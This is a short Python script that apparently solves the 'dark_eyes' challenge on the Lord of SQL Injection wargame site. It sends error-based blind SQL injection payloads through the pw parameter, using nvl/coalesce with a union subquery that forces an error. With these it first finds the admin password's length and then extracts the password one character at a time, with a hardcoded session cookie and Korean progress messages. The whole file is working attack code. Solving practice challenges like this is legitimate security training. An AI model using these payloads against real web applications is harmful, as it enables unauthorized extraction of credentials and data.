# -*- coding: utf-8 -*-
import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="
head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}

length = 1
pwd = ''

while (1):
    query = "' or id='admin' and nvl((select id where id='admin' and length(pw)='{}'),(select 1 union select 2))%23".format(length)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "query" in req.text:
        print("총 길이는",length)
        break
    else:
        length += 1
        

for i in range(1, length+1):
    for j in range(48, 122):
        query = "' or id='admin' and coalesce((select id where id='admin' and substr(pw,{},1)='{}'),(select 1 union select 2))%23".format(str(i),chr(j))
        req = requests.get(url+query, headers=head)
        if "query" in req.text:
            pwd += chr(j)
            print(i,"번째 문자 찾는 중 .. : ",pwd)
            break

        
            
print("pw : ",pwd)